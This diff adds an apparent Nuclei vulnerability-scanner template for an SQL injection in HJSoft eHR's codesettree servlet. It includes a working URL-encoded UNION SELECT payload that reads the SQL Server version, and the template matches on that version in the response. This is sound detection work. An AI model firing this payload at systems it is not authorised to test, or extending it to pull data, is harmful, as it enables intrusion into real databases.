@@ -1,0 +1,33 @@
+id: hjsoft-ehr-codesettree-sqli
+info:
+  name: HJSoft eHR Codesettree SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+http:
+  - raw:
+      - |
+        GET /servlet/codesettree?categories=&codesetid=1&flag=c&parentid=-1&status=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '<?xml version')"
+          - "contains(body, '<TreeNode')"
+          - "!contains(body, 'Microsoft SQL Server')"
+
+  - raw:
+      - |
+        GET /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjingSqli~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '<?xml version')"
+          - "contains(body, '<TreeNode')"
+          - "contains(body, 'hongjingSqli')"
+          - "contains(body, 'Microsoft SQL Server')"
